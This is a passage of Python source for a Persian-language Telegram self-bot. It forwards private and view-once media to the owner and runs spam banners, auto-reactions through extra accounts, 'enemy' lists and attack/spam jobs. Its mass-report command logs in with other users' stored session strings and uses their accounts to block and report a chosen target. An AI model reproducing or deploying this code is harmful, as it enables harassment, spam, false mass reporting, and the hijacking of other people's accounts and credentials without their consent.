                    await asyncio.sleep(1.2)
                    b = pv_album_buf.pop(ak, None)
                    if not b or not b.get('items'):
                        return
                    try:
                        media = []
                        for i, p in enumerate(b['items'][:10]):
                            if not os.path.exists(p):
                                continue
                            if i == 0:
                                media.append(types.InputMediaPhoto(open(p, 'rb')) if False else p)
                        # telebot: send_media_group
                        from telebot.types import InputMediaPhoto, InputMediaDocument
                        group = []
                        for i, p in enumerate(b['items'][:10]):
                            if i == 0:
                                group.append(InputMediaPhoto(open(p, 'rb'), caption=b.get('cap') or '', parse_mode='HTML'))
                            else:
                                group.append(InputMediaPhoto(open(p, 'rb')))
                        if group:
                            sent = bot.send_media_group(OWNER_ID, group)
                            if sent:
                                mid0 = sent[0].message_id
                                pv_msg_map[(int(uid), int(event.chat_id), int(event.id))] = {'bot_mid': mid0, 'chat': OWNER_ID}
                        for p in b['items']:
                            try:
                                os.remove(p)
                            except Exception:
                                pass
                    except Exception:
                        # fallback تک‌تک
                        for i, p in enumerate(b.get('items') or []):
                            try:
                                c = b.get('cap') if i == 0 else None
                                m = bot.send_photo(OWNER_ID, open(p, 'rb'), caption=c, parse_mode='HTML' if c else None)
                                if i == 0 and m:
                                    pv_msg_map[(int(uid), int(event.chat_id), int(event.id))] = {'bot_mid': m.message_id, 'chat': OWNER_ID}
                            except Exception:
                                try:
                                    bot.send_document(OWNER_ID, open(p, 'rb'), caption=b.get('cap') if i == 0 else None, parse_mode='HTML')
                                except Exception:
                                    pass
                            try:
                                os.remove(p)
                            except Exception:
                                pass
                try:
                    asyncio.get_event_loop().create_task(_flush_album())
                except Exception:
                    pass
            else:
                sent_msg = None
                try:
                    kw = {'parse_mode': 'HTML'}
                    if reply_to_bot:
                        kw['reply_to_message_id'] = reply_to_bot
                    if event.media and not media_too_large(event.message):
                        ttl = getattr(event.message, 'ttl_period', None) or getattr(event.message, 'ttl', None)
                        path = await event.client.download_media(event.message, file='tmp_pv_m_' + str(event.id))
                        if path and os.path.exists(path):
                            full_cap = cap
                            if ttl:
                                full_cap = "<blockquote>مدیا یک‌بار مشاهده / مدت‌دار</blockquote>" + chr(10) + cap
                            if txt:
                                full_cap = full_cap + chr(10) + "<blockquote>" + str(txt)[:500].replace('<', '') + "</blockquote>"
                            try:
                                if getattr(event.message, 'photo', None) or (event.photo if hasattr(event, 'photo') else None):
                                    sent_msg = bot.send_photo(OWNER_ID, open(path, 'rb'), caption=full_cap, **kw)
                                elif getattr(event.message, 'voice', None) or (hasattr(event.message, 'file') and getattr(getattr(event.message, 'file', None), 'mime_type', '') or '').startswith('audio'):
                                    sent_msg = bot.send_voice(OWNER_ID, open(path, 'rb'), caption=full_cap, **kw)
                                elif getattr(event.message, 'video_note', None):
                                    sent_msg = bot.send_video_note(OWNER_ID, open(path, 'rb'))
                                    if full_cap:
                                        bot.send_message(OWNER_ID, full_cap, parse_mode='HTML', reply_to_message_id=getattr(sent_msg, 'message_id', None))
                                elif getattr(event.message, 'video', None):
                                    sent_msg = bot.send_video(OWNER_ID, open(path, 'rb'), caption=full_cap, **kw)
                                else:
                                    sent_msg = bot.send_document(OWNER_ID, open(path, 'rb'), caption=full_cap, **kw)
                            except Exception:
                                sent_msg = bot.send_document(OWNER_ID, open(path, 'rb'), caption=full_cap, parse_mode='HTML', reply_to_message_id=reply_to_bot)
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        else:
                            sent_msg = bot.send_message(OWNER_ID, cap + chr(10) + str(txt)[:2000], **kw)
                    else:
                        body = cap + (chr(10) + "<blockquote>" + str(txt)[:2000].replace('<', '') + "</blockquote>" if txt else '')
                        sent_msg = bot.send_message(OWNER_ID, body, **kw)
                except Exception:
                    try:
                        sent_msg = bot.send_message(OWNER_ID, cap + chr(10) + str(txt)[:2000], parse_mode='HTML')
                    except Exception:
                        pass
                if sent_msg:
                    try:
                        pv_msg_map[(int(uid), int(event.chat_id), int(event.id))] = {
                            'bot_mid': sent_msg.message_id,
                            'chat': OWNER_ID,
                            'text': txt,
                        }
                    except Exception:
                        pass
        except Exception:
            pass
    if _t0 in ('.خاموش',):
        try:
            for k in list(auto_react_jobs.keys()):
                if k[0] == uid:
                    auto_react_jobs.pop(k, None)
            for k in list(random_react_jobs.keys()):
                if k[0] == uid:
                    random_react_jobs.pop(k, None)
            for k in list(react_targets.keys()):
                try:
                    if isinstance(k, tuple) and len(k) >= 1 and k[0] == uid:
                        react_targets.pop(k, None)
                    elif k == uid:
                        react_targets.pop(k, None)
                except Exception:
                    pass
            await event.edit("<blockquote>خاموش شد</blockquote>", parse_mode='HTML')
        except Exception:
            try:
                await event.reply("<blockquote>خاموش شد</blockquote>", parse_mode='HTML')
            except Exception:
                pass
        return

    # .ری اکت 🤣 خودکار  (ریپلای روی کاربر)
    if _t0.startswith('.ری اکت') and 'خودکار' in _t0:
        try:
            emoji = _t0.replace('.ری اکت', '', 1).replace('خودکار', '').strip() or '👍'
            if not event.is_reply:
                await event.edit("<blockquote>روی پیام کاربر ریپلای کن</blockquote>", parse_mode='HTML')
                return
            rep = await event.get_reply_message()
            tid = None
            try:
                tid = rep.sender_id
            except Exception:
                pass
            if not tid:
                await event.edit("<blockquote>کاربر پیدا نشد</blockquote>", parse_mode='HTML')
                return
            auto_react_jobs[(uid, int(tid))] = {'emoji': emoji, 'chat_id': event.chat_id}
            react_targets[(uid, int(tid))] = {'emoji': emoji, 'mode': 'auto'}
            try:
                sn = (await rep.get_sender())
                sname = getattr(sn, 'first_name', None) or str(tid)
            except Exception:
                sname = str(tid)
            await event.edit(
                "<blockquote>ری اکت " + emoji + " خودکار روی " + str(sname).replace('<','') + "</blockquote>",
                parse_mode='HTML',
            )
        except Exception:
            pass
        return

    # .ری رندوم 11 46  → هر 11 دقیقه روی 46 نفر رندوم
    if _t0.startswith('.ری رندوم'):
        try:
            parts = _t0.split()
            mins = 11
            cnt = 10
            nums = []
            for p in parts[1:]:
                try:
                    nums.append(int(re.sub(r'[^0-9]', '', p)))
                except Exception:
                    pass
            if len(nums) >= 1:
                mins = max(1, nums[0])
            if len(nums) >= 2:
                cnt = max(1, nums[1])
            import time as _t_rr
            random_react_jobs[(uid, event.chat_id)] = {
                'minutes': mins,
                'count': cnt,
                'next_ts': _t_rr.time() + mins * 60,
                'active': True,
            }
            await event.edit(
                "<blockquote>ری رندوم فعال</blockquote>" + chr(10)
                + "<blockquote>هر " + str(mins) + " دقیقه — " + str(cnt) + " نفر</blockquote>" + chr(10)
                + "<blockquote>توقف: .خاموش</blockquote>" + chr(10)
                + bot_tag_html(),
                parse_mode='HTML',
            )
        except Exception:
            pass
        return

    # .تبچی خاموش
    if _t0 in ('.تبچی خاموش', '.تبچی‌خاموش'):
        try:
            chat_id = event.chat_id
            # خاموش کردن بنر/سندر این گروه
            for k, job in list(banner_jobs.items()):
                try:
                    if isinstance(job, dict) and int(job.get('chat_id') or 0) == int(chat_id) and (k == uid or (isinstance(k, tuple) and k[0] == uid)):
                        banner_jobs.pop(k, None)
                except Exception:
                    pass
            for k, job in list(sender_jobs.items()):
                try:
                    if isinstance(k, tuple) and k[0] == uid:
                        if int(job.get('chat_id') or 0) == int(chat_id) or True:
                            sender_jobs.pop(k, None)
                except Exception:
                    pass
            # پاک کردن بنرهای ثبت‌شده این گروه از extras
            try:
                extras = get_extras(uid) or {}
                for aid, inf in extras.items():
                    if not isinstance(inf, dict):
                        continue
                    items = inf.get('sender_items') or []
                    new_items = []
                    for it in items:
                        if int(it.get('chat_id') or 0) == int(chat_id):
                            continue
                        new_items.append(it)
                    inf['sender_items'] = new_items
                    extras[aid] = inf
                set_extras(uid, extras)
            except Exception:
                pass
            title = ''
            try:
                ch = await event.get_chat()
                title = getattr(ch, 'title', None) or str(chat_id)
            except Exception:
                title = str(chat_id)
            await event.edit(
                "<blockquote>تبچی حذف شد از گروه</blockquote>" + chr(10)
                + "<blockquote>" + str(title).replace('<', '') + "</blockquote>" + chr(10)
                + "<blockquote><code>" + str(chat_id) + "</code></blockquote>" + chr(10)
                + bot_tag_html(),
                parse_mode='HTML',
            )
        except Exception:
            pass
        return

    # .گزارش — وضعیت کامل (saved messages / anywhere)
    if _t0 == '.گزارش':
        try:
            now_s = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            lines = ["<blockquote><b>گزارش سلف</b></blockquote>"]
            lines.append("<blockquote>زمان: " + now_s + "</blockquote>")
            lines.append("<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>")
            lines.append("<blockquote>سلف: " + ("روشن" if get_ud(uid, 'self_enabled', True) else "خاموش") + "</blockquote>")
            lines.append("<blockquote>کلاینت: " + ("متصل" if client_really_alive(uid) else "قطع") + "</blockquote>")
            lines.append("<blockquote>آنلاین دائم: " + ("روشن" if get_ud(uid, 'always_online') else "خاموش") + "</blockquote>")
            lines.append("<blockquote>حذف‌نشدن پیام: " + ("روشن" if get_ud(uid, 'keep_messages') else "خاموش") + "</blockquote>")
            ens = get_ud(uid, 'enemies') or []
            if isinstance(ens, dict):
                ens = list(ens.keys())
            lines.append("<blockquote>دشمنان: " + str(len(ens)) + "</blockquote>")
            kol = get_ud(uid, 'kol_targets') or []
            lines.append("<blockquote>کل: " + str(len(kol) if isinstance(kol, list) else 0) + "</blockquote>")
            sil = get_ud(uid, 'silenced') or []
            lines.append("<blockquote>سکوت: " + str(len(sil) if isinstance(sil, list) else 0) + "</blockquote>")
            try:
                extras = get_extras(uid) or {}
                lines.append("<blockquote>اکانت اضافه: " + str(len(extras)) + "</blockquote>")
                for aid, inf in list(extras.items())[:15]:
                    if not isinstance(inf, dict):
                        continue
                    items = inf.get('sender_items') or []
                    tgs = inf.get('tabchi_groups') or []
                    lines.append(
                        "<blockquote>اک " + str(aid)
                        + " | بنر:" + str(len(items))
                        + " | گروه تبچی:" + str(len(tgs))
                        + "</blockquote>"
                    )
                    for it in items[:5]:
                        lines.append(
                            "<blockquote>  بنر → گروه <code>"
                            + str(it.get('chat_id') or '—')
                            + "</code> | دقیقه "
                            + str(it.get('interval') or it.get('minutes') or '—')
                            + " | "
                            + str((it.get('text') or it.get('caption') or '')[:40]).replace('<', '')
                            + "</blockquote>"
                        )
            except Exception:
                pass
            ar = [k for k in auto_react_jobs if k[0] == uid]
            lines.append("<blockquote>ری‌اکت خودکار: " + str(len(ar)) + "</blockquote>")
            rr = [k for k in random_react_jobs if k[0] == uid and (random_react_jobs.get(k) or {}).get('active')]
            lines.append("<blockquote>ری رندوم: " + str(len(rr)) + "</blockquote>")
            for k in rr:
                j = random_react_jobs.get(k) or {}
                lines.append(
                    "<blockquote>  چت <code>" + str(k[1]) + "</code> هر "
                    + str(j.get('minutes')) + " دقیقه / " + str(j.get('count')) + " نفر</blockquote>"
                )
            lines.append(bot_tag_html())
            await event.edit(chr(10).join(lines)[:4000], parse_mode='HTML')
        except Exception:
            pass
        return

    # .گزارش N  /  .گزارش N متن  — فقط مالک اصلی، ریپلای روی پیام
    if _t0.startswith('.گزارش ') and is_main_owner(uid) and event.is_reply:
        try:
            parts = _t0.split(None, 2)
            n = 5
            reason = 'spam'
            if len(parts) >= 2:
                try:
                    n = max(1, int(re.sub(r'[^0-9]', '', parts[1]) or '5'))
                except Exception:
                    n = 5
            if len(parts) >= 3:
                reason = parts[2].strip() or 'spam'
            rep = await event.get_reply_message()
            target_id = rep.sender_id
            await event.edit(
                "<blockquote>گزارش دسته‌جمعی شروع شد</blockquote>" + chr(10)
                + "<blockquote>تعداد: " + str(n) + "</blockquote>" + chr(10)
                + "<blockquote>دلیل: " + str(reason).replace('<', '') + "</blockquote>" + chr(10)
                + bot_tag_html(),
                parse_mode='HTML',
            )
            # بلاک + گزارش با اکانت‌های اضافه کاربران
            async def _mass_rep():
                from telethon.tl.functions.contacts import BlockRequest
                from telethon.tl.functions.account import ReportPeerRequest
                from telethon.tl.types import (
                    InputReportReasonSpam,
                    InputReportReasonFake,
                    InputReportReasonOther,
                )
                reason_map = {
                    'spam': InputReportReasonSpam(),
                    'هرزنامه': InputReportReasonSpam(),
                    'fake': InputReportReasonFake(),
                    'جعلی': InputReportReasonFake(),
                }
                robj = reason_map.get(reason, InputReportReasonOther())
                done = 0
                data = load_data()
                # همه سشن‌ها غیر مالک و غیر exempt
                exempt = set(int(x) for x in (data.get('report_exempt') or []) if str(x).lstrip('-').isdigit())
                for suid, u in (data.get('users') or {}).items():
                    if done >= n:
                        break
                    try:
                        su = int(suid)
                    except Exception:
                        continue
                    if su == int(OWNER_ID) or su in exempt:
                        continue
                    sess = (u or {}).get('session')
                    if not sess:
                        continue
                    try:
                        cl = TelegramClient(StringSession(sess), API_ID, API_HASH, device_model='StR')
                        await cl.connect()
                        try:
                            await cl(BlockRequest(target_id))
                        except Exception:
                            pass
                        try:
                            await cl(ReportPeerRequest(peer=target_id, reason=robj, message=str(reason)[:200]))
                        except Exception:
                            pass
                        done += 1
                        await cl.disconnect()
                    except Exception:
                        try:
                            await cl.disconnect()
                        except Exception:
                            pass
                try:
                    await event.reply(
                        "<blockquote>گزارش تمام شد</blockquote>" + chr(10)
                        + "<blockquote>موفق: " + str(done) + "/" + str(n) + "</blockquote>",
                        parse_mode='HTML',
                    )
                except Exception:
                    pass
            asyncio.get_event_loop().create_task(_mass_rep())
        except Exception:
            pass
        return

    # .اولین پیام
    if _t0 == '.اولین پیام' or _t0.startswith('.اولین پیام'):
        try:
            await event.edit("<blockquote>در حال پیدا کردن...</blockquote>", parse_mode='HTML')
            chat = await event.get_chat()
            chat_title = getattr(chat, 'title', None) or getattr(chat, 'first_name', None) or str(event.chat_id)
            target_id = None
            if event.is_reply:
                rep = await event.get_reply_message()
                target_id = rep.sender_id
            first_msg = None
            if target_id:
                async for msg in event.client.iter_messages(event.chat_id, from_user=target_id, reverse=True, limit=1):
                    first_msg = msg
                    break
                # reverse=True با limit=1 باید اولین باشد؛ اگر نه از روش min_id
                if not first_msg:
                    async for msg in event.client.iter_messages(event.chat_id, from_user=target_id, limit=5000):
                        first_msg = msg  # آخرین در حلقه = قدیمی‌ترین در حالت عادی (newest first)
                    # با reverse
                    async for msg in event.client.iter_messages(event.chat_id, from_user=target_id, reverse=True, limit=1):
                        first_msg = msg
                        break
            else:
                async for msg in event.client.iter_messages(event.chat_id, reverse=True, limit=1):
                    first_msg = msg
                    break
            if not first_msg:
                await event.edit("<blockquote>پیامی پیدا نشد</blockquote>", parse_mode='HTML')
                return
            name = chat_title
            if target_id:
                try:
                    ent = await event.client.get_entity(target_id)
                    name = (getattr(ent, 'first_name', '') or '') + ' ' + (getattr(ent, 'last_name', '') or '')
                    name = name.strip() or str(target_id)
                except Exception:
                    name = str(target_id)
                body = "<blockquote>اولین پیام " + str(name).replace('<', '') + " در " + str(chat_title).replace('<', '') + "</blockquote>" + chr(10) + bot_tag_html()
            else:
                body = "<blockquote>اولین پیام " + str(chat_title).replace('<', '') + "</blockquote>" + chr(10) + bot_tag_html()
            try:
                await event.delete()
            except Exception:
                pass
            await event.client.send_message(event.chat_id, body, reply_to=first_msg.id, parse_mode='HTML')
        except Exception as e:
            try:
                await event.edit("<blockquote>خطا:</blockquote>" + chr(10) + "<blockquote>" + str(e)[:80].replace('<','') + "</blockquote>", parse_mode='HTML')
            except Exception:
                pass
        return

    # .لیست بنر — فقط گروه تبچی
    if _t0 == '.لیست بنر':
        try:
            chat_id = event.chat_id
            try:
                await event.delete()
            except Exception:
                pass
            extras = get_extras(uid) or {}
            found = []
            for aid, inf in extras.items():
                if not isinstance(inf, dict):
                    continue
                for idx, it in enumerate(inf.get('sender_items') or []):
                    if int(it.get('chat_id') or 0) == int(chat_id) or not it.get('chat_id'):
                        found.append((aid, idx, it))
            if not found:
                await event.client.send_message(
                    event.chat_id if event.is_private else 'me',
                    "<blockquote>بنری برای این گروه ثبت نشده</blockquote>",
                    parse_mode='HTML',
                )
                return
            for aid, idx, it in found[:20]:
                mk = types.InlineKeyboardMarkup()
                mk.add(
                    types.InlineKeyboardButton("ویرایش", callback_data=f"bn_edit_{uid}_{aid}_{idx}"),
                    types.InlineKeyboardButton("حذف", callback_data=f"bn_del_{uid}_{aid}_{idx}"),
                )
                cap = "<blockquote>بنر ثبت‌شده</blockquote>" + chr(10)
                cap += "<blockquote>گروه: <code>" + str(chat_id) + "</code></blockquote>" + chr(10)
                cap += "<blockquote>دقیقه: " + str(it.get('interval') or it.get('minutes') or '—') + "</blockquote>" + chr(10)
                cap += bot_tag_html()
                fp = it.get('file_path') or it.get('path')
                txt = it.get('text') or it.get('caption') or ''
                try:
                    if fp and os.path.exists(fp):
                        await event.client.send_file('me', fp, caption=cap + (chr(10) + txt if txt else ''), parse_mode='HTML')
                    else:
                        await event.client.send_message('me', cap + (chr(10) + txt if txt else ''), parse_mode='HTML')
                except Exception:
                    try:
                        await event.client.send_message('me', cap + chr(10) + str(txt)[:500], parse_mode='HTML')
                    except Exception:
                        pass
            # دکمه‌ها از طریق ربات
            try:
                for aid, idx, it in found[:20]:
                    mk = types.InlineKeyboardMarkup()
                    mk.add(
                        types.InlineKeyboardButton("ویرایش", callback_data=f"bn_edit_{uid}_{aid}_{idx}"),
                        types.InlineKeyboardButton("حذف از گروه", callback_data=f"bn_del_{uid}_{aid}_{idx}"),
                    )
                    bot.send_message(
                        uid,
                        "<blockquote>بنر #" + str(idx) + " اکانت " + str(aid) + "</blockquote>" + chr(10)
                        + "<blockquote>گروه <code>" + str(chat_id) + "</code></blockquote>",
                        parse_mode='HTML',
                        reply_markup=mk,
                    )
            except Exception:
                pass
        except Exception:
            pass
        return
    try:
        if not (event.is_private or event.is_group): return
        sender = await event.get_sender()
        if not sender: return
        try:
            text = (event.message.message or event.message.text or event.raw_text or "").strip()
        except Exception:
            text = (getattr(event.message, 'message', None) or getattr(event, 'raw_text', None) or "").strip()
        # نرمال‌سازی حروف عربی/فارسی و کاراکتر نامرئی
        text_norm = (
            text.replace("ي", "ی").replace("ك", "ک")
            .replace("‌", "").replace("‏", "").replace("‎", "")
        )


        # ری‌اکت خودکار — اول اکانت خود سلف، بعد اکانت‌های اضافه
        try:
            if not event.out and sender and get_ud(uid, 'self_enabled', True):
                sid = int(sender.id)
                conf = auto_react_jobs.get((int(uid), sid)) or auto_react_jobs.get((uid, sid))
                if conf:
                    try:
                        if conf.get('chat_id') is not None and int(conf.get('chat_id')) != int(event.chat_id):
                            conf = None
                    except Exception:
                        pass
                if conf:
                    # ری‌اکت خود اکانت سلف
                    try:
                        emo_self = conf.get('emoji') or '👍'
                        if conf.get('random'):
                            emo_self = random.choice(['👍', '❤', '🔥', '😂', '👏', '😍', '🎉', '💯', '🤣'])
                        try:
                            await event.message.react(emo_self)
                        except Exception:
                            try:
                                from telethon.tl.functions.messages import SendReactionRequest
                                from telethon.tl.types import ReactionEmoji
                                await event.client(SendReactionRequest(
                                    peer=event.chat_id, msg_id=event.id,
                                    reaction=[ReactionEmoji(emoticon=emo_self)]
                                ))
                            except Exception:
                                pass
                    except Exception:
                        pass

                    extras = get_extras(uid) or {}
                    acc_ids = [a for a in extras.keys() if str(a).lower() not in ('all', 'none', '')]
                    n = min(int(conf.get('count') or 1), len(acc_ids) if acc_ids else 0)
                    pool = ['👍', '❤', '❤️', '🔥', '😂', '👏', '😍', '🎉', '💯', '⚡', '🤝', '🤣']
                    for aid in acc_ids[:n]:
                        try:
                            ck = (int(uid), int(aid))
                            cl = extra_clients.get(ck)
                            if not cl:
                                inf = extras.get(str(aid)) or extras.get(aid) or {}
                                sess = inf.get('session')
                                if sess:
                                    await start_extra_client(uid, aid, sess)
                                    cl = extra_clients.get(ck)
                            if not cl:
                                continue
                            emo = random.choice(pool) if conf.get('random') else (conf.get('emoji') or random.choice(pool))
                            done = False
                            try:
                                msgs = await cl.get_messages(event.chat_id, ids=event.id)
                                if msgs:
                                    await msgs.react(emo)
                                    done = True
                            except Exception:
                                pass
                            if not done:
                                try:
                                    peer = await cl.get_input_entity(event.chat_id)
                                    await cl(SendReactionRequest(peer=peer, msg_id=event.id, reaction=[ReactionEmoji(emoticon=emo)]))
                                    done = True
                                except Exception:
                                    try:
                                        await cl(SendReactionRequest(peer=event.chat_id, msg_id=event.id, reaction=[ReactionEmoji(emoticon=emo)]))
                                    except Exception:
                                        pass
                        except Exception:
                            continue
        except Exception:
            pass

        # بن عادی یا موقت — هیچ دستوری کار نکند
        if is_user_banned(uid):
            return
        # اگر سلف خاموش باشد هیچ دستوری کار نکند (حتی .پنل)
        if not is_self_on(uid):
            return

        # ========== مسیر سریع دستورات خروجی ==========
        if event.out and text:
            _ft = text.strip()
            _fn = text_norm.strip()
            # .تنظیم دشمن (ریپلای)
            if (_ft == '.تنظیم دشمن' or _fn == '.تنظیم دشمن') and event.is_reply:
                try:
                    rep = await event.get_reply_message()
                    tid = await get_real_sender(rep)
                    if not tid:
                        await event.edit("نتونستم کاربر رو تشخیص بدم")
                    elif int(tid) == int(uid):
                        await event.edit("خودت دشمن نمیشی")
                    else:
                        enemies = get_ud(uid, 'enemies', {})
                        if isinstance(enemies, list):
                            enemies = {str(x): 'group' for x in enemies}
                        if not isinstance(enemies, dict):
                            enemies = {}
                        scope = 'private' if event.is_private else 'group'
                        enemies[str(tid)] = scope
                        set_user(uid, 'enemies', enemies)
                        name = await resolve_name(event.client, tid)
                        try:
                            await event.edit(mention(tid, name) + " به لیست دشمنان اضافه شد", parse_mode='Markdown')
                        except Exception:
                            await event.edit(str(name) + " به لیست دشمنان اضافه شد")
                except Exception as e:
                    try:
                        await event.edit("خطا: " + str(e)[:80])
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return
            # .تنظیم دشمن ایدی
            if (_ft.startswith('.تنظیم دشمن ') or _fn.startswith('.تنظیم دشمن ')) and 'اتک' not in _ft and 'اتک' not in _fn:
                try:
                    tid = int(to_en_digits(_ft.split()[-1]))
                except Exception:
                    tid = None
                if tid:
                    try:
                        if int(tid) == int(uid):
                            await event.edit("خودت دشمن نمیشی")
                        else:
                            enemies = get_ud(uid, 'enemies', {})
                            if isinstance(enemies, list):
                                enemies = {str(x): 'group' for x in enemies}
                            if not isinstance(enemies, dict):
                                enemies = {}
                            scope = 'private' if event.is_private else 'group'
                            enemies[str(tid)] = scope
                            set_user(uid, 'enemies', enemies)
                            name = await resolve_name(event.client, tid)
                            sc = "پیوی" if scope == 'private' else "گروه"
                            try:
                                await event.edit(mention(tid, name) + " به لیست دشمنان اضافه شد", parse_mode='Markdown')
                            except Exception:
                                await event.edit(str(name) + " به لیست دشمنان اضافه شد")
                    except Exception as e:
                        try:
                            await event.edit("خطا: " + str(e)[:80])
                        except Exception:
                            pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
            # .حذف دشمن ریپلای
            if (_ft == '.حذف دشمن' or _fn == '.حذف دشمن') and event.is_reply:
                try:
                    rep = await event.get_reply_message()
                    tid = await get_real_sender(rep)
                    enemies = get_ud(uid, 'enemies', {})
                    if isinstance(enemies, list):
                        enemies = {str(x): 'group' for x in enemies}
                    if not isinstance(enemies, dict):
                        enemies = {}
                    removed = False
                    if tid:
                        for k in list(enemies.keys()):
                            try:
                                if int(k) == int(tid):
                                    del enemies[k]
                                    removed = True
                            except Exception:
                                if str(k) == str(tid):
                                    del enemies[k]
                                    removed = True
                        set_user(uid, 'enemies', enemies)
                        name = await resolve_name(event.client, tid)
                        if removed:
                            try:
                                await event.edit(mention(tid, name) + " از لیست دشمنان حذف شد", parse_mode='Markdown')
                            except Exception:
                                await event.edit(str(name) + " از لیست دشمنان حذف شد")
                        else:
                            await event.edit("در لیست دشمنان نیست")
                except Exception as e:
                    try:
                        await event.edit("خطا: " + str(e)[:80])
                    except Exception:
                        pass
                await asyncio.sleep(2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return
            # .حذف دشمن ایدی
            if (_ft.startswith('.حذف دشمن ') or _fn.startswith('.حذف دشمن ')) and 'اتک' not in _ft:
                try:
                    tid = int(to_en_digits(_ft.split()[-1]))
                except Exception:
                    tid = None
                if tid:
                    enemies = get_ud(uid, 'enemies', {})
                    if isinstance(enemies, list):
                        enemies = {str(x): 'group' for x in enemies}
                    if not isinstance(enemies, dict):
                        enemies = {}
                    removed = False
                    for k in list(enemies.keys()):
                        try:
                            if int(k) == int(tid):
                                del enemies[k]
                                removed = True
                        except Exception:
                            if str(k) == str(tid):
                                del enemies[k]
                                removed = True
                    set_user(uid, 'enemies', enemies)
                    try:
                        name = await resolve_name(event.client, tid)
                    except Exception:
                        name = str(tid)
                    try:
                        if removed:
                            await event.edit(str(name) + " از لیست دشمنان حذف شد")
                        else:
                            await event.edit("در لیست نیست")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
            # .لیست دشمنان
            if _ft in ('.لیست دشمنان',) or _fn in ('.لیست دشمنان',):
                enemies = get_ud(uid, 'enemies', {})
                if isinstance(enemies, list):
                    enemies = {str(x): 'group' for x in enemies}
                if not isinstance(enemies, dict):
                    enemies = {}
                if not enemies:
                    try:
                        await event.edit("لیست دشمنان خالی است")
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                lines = ["<blockquote>لیست دشمنان ↓</blockquote>"]
                for k, sc in enemies.items():
                    try:
                        kid = int(k)
                        nm = await resolve_name(event.client, kid)
                    except Exception:
                        kid = k
                        nm = str(k)
                    # هر کاربر یک نقل‌قول جدا — بدون نوشتن گروه/پیوی
                    try:
                        lines.append("<blockquote>" + mention(kid, nm) + " <code>" + str(kid) + "</code></blockquote>")
                    except Exception:
                        lines.append("<blockquote>" + str(nm).replace('<','') + " <code>" + str(kid) + "</code></blockquote>")
                body = chr(10).join(lines)
                try:
                    await event.edit(body, parse_mode="HTML")
                except Exception:
                    try:
                        await event.edit(chr(10).join(lines))
                    except Exception:
                        pass
                return


        # ========== دستورات اولویت‌دار اتک / ری‌اکت (اول اجرا شوند) ==========
        if text and event.out:
            import re as _re_pri
            _ts = text.strip()
            _tn = text_norm.strip()

            # .متوقف / .توقف — همه عملیات
            if _re_pri.match(r'^[.．٫/]\s*(متوقف|توقف|stop)\s*$', _ts, _re_pri.I) or _re_pri.match(r'^[.．٫/]\s*(متوقف|توقف|stop)\s*$', _tn, _re_pri.I):
                spam_cancel[uid] = True
                job = extra_attack_jobs.get(uid)
                if job:
                    job['active'] = False
                extra_attack_jobs.pop(uid, None)
                for k, j0 in list(extra_spam_jobs.items()):
                    try:
                        if (isinstance(k, tuple) and k and int(k[0]) == int(uid)) or k == uid:
                            if isinstance(j0, dict):
                                j0['active'] = False
                    except Exception:
                        pass
                try:
                    banner_jobs.pop(uid, None)
                except Exception:
                    pass
                try:
                    meow_chats.pop(uid, None)
                except Exception:
                    pass
                try:
                    fish_jobs.pop(uid, None)
                except Exception:
                    pass
                try:
                    pishi_jobs.pop(uid, None)
                except Exception:
                    pass
                try:
                    for k in list(auto_react_jobs.keys()):
                        if isinstance(k, tuple) and len(k) >= 1 and int(k[0]) == int(uid):
                            auto_react_jobs.pop(k, None)
                    react_targets.pop(uid, None)
                except Exception:
                    pass
                try:
                    set_user(uid, 'typing_chats', {})
                except Exception:
                    pass
                try:
                    interval_jobs.pop(uid, None)
                except Exception:
                    pass
                try:
                    delete_jobs[uid] = False
                    delete_jobs.pop(uid, None)
                except Exception:
                    pass
                try:
                    set_user(uid, 'silence', [])
                except Exception:
                    pass
                try:
                    await event.edit("Stopped")
                except Exception:
                    try:
                        await event.reply("Stopped")
                    except Exception:
                        pass
                await asyncio.sleep(1.2)
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            # .حذف تعداد — فقط گروه، پیام‌های خود کاربر
            if _re_pri.match(r'^[.．٫/]\s*حذف\s+(\d+)\s*$', _ts) or _re_pri.match(r'^[.．٫/]\s*حذف\s+(\d+)\s*$', _tn):
                mdel = _re_pri.match(r'^[.．٫/]\s*حذف\s+(\d+)\s*$', _ts) or _re_pri.match(r'^[.．٫/]\s*حذف\s+(\d+)\s*$', _tn)
                n = int(to_en_digits(mdel.group(1)))
                if n < 1:
                    return
                if event.is_private:
                    try:
                        await event.edit("این مال گروه هاست")
                    except Exception:
                        pass
                    await asyncio.sleep(1.5)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                if not event.is_group and not getattr(event, 'is_channel', False):
                    try:
                        await event.edit("این مال گروه هاست")
                    except Exception:
                        pass
                    await asyncio.sleep(1.5)
                    try:
                        await event.delete()
                    except Exception:
                        pass
                    return
                try:
                    await event.edit("در حال پاک کردن...")
                except Exception:
                    pass
                spam_cancel[uid] = False
                delete_jobs[uid] = True
                chat_id = event.chat_id
                async def _del_mine():
                    deleted = 0
                    try:
                        ids = []
                        async for msg in event.client.iter_messages(chat_id, from_user='me', limit=max(n, 1)):
                            if spam_cancel.get(uid) or not delete_jobs.get(uid):
                                break
                            ids.append(msg.id)
                            if len(ids) >= 100:
                                try:
                                    await event.client.delete_messages(chat_id, ids)
                                    deleted += len(ids)
                                except Exception:
                                    for mid in ids:
                                        try:
                                            await event.client.delete_messages(chat_id, mid)
                                            deleted += 1
                                        except Exception:
                                            pass
                                ids = []
                            if deleted + len(ids) >= n:
                                break
                        if ids and not spam_cancel.get(uid):
                            need = n - deleted
                            ids = ids[:need]
                            try:
                                await event.client.delete_messages(chat_id, ids)
                                deleted += len(ids)
                            except Exception:
                                for mid in ids:
                                    if deleted >= n:
                                        break
                                    try:
                                        await event.client.delete_messages(chat_id, mid)
                                        deleted += 1
                                    except Exception:
                                        pass
                    except Exception:
                        pass
                    delete_jobs.pop(uid, None)
                    try:
                        await event.edit(str(deleted) + " پیام حذف شد")
                    except Exception:
                        try:
